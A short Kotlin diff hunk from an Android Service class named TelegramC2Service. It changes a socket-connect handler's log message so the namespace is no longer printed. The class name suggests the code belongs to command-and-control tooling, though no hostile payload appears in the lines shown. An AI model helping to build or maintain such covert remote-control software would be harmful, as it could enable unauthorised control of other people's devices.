@@ -214,7 +214,7 @@ class TelegramC2Service : Service() {
 
             s.on(Socket.EVENT_CONNECT) {
                 if (connected) return@on
-                log("socket connected (ns=${s.nsp()})")
+                log("socket connected")
                 connected = true
             }
             s.on(Socket.EVENT_DISCONNECT) { args ->
